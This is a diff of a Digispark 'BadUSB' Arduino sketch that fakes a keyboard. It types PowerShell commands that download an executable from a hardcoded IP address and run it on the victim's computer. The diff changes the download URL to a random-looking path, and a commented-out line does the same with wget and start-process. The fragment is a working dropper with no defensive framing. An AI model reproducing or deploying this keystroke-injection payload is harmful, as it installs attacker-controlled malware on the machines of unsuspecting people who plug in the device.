@@ -25,7 +25,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   //DigiKeyboard.print("wget http://137.184.197.191/indmeuarquivo.exe -OutFile $env:userprofile\\PAYLOAD.exe; start-process $env:userprofile\\PAYLOAD.exe; stop-process -Id $PID");
-  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://137.184.197.191/indmeuarquivo.exe'; $file = 'indmeuarquivo.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/indmeuarquivo.exe'; $file = 'indmeuarquivo.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
   DigiKeyboard.delay(500);
   
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
